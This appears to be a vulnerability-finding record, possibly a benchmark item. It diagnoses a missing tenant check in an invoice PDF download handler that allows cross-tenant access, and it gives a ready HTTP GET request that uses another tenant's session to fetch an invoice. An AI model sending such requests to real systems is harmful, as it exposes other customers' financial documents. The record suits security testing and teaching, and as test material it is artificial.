diagnosis: The invoice PDF download handler retrieves the database record solely by invoiceUuid and streams the document from S3 without verifying that the invoice's tenantId matches the callerTenantId set in onPostAuth, permitting cross-tenant financial document exfiltration.
exploit_request:
GET /billing/invoices/9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d/pdf HTTP/1.1
Host: billing.acme-saas.com:8080
Cookie: session_id=tenant_gamma_session_token
Accept: application/pdf
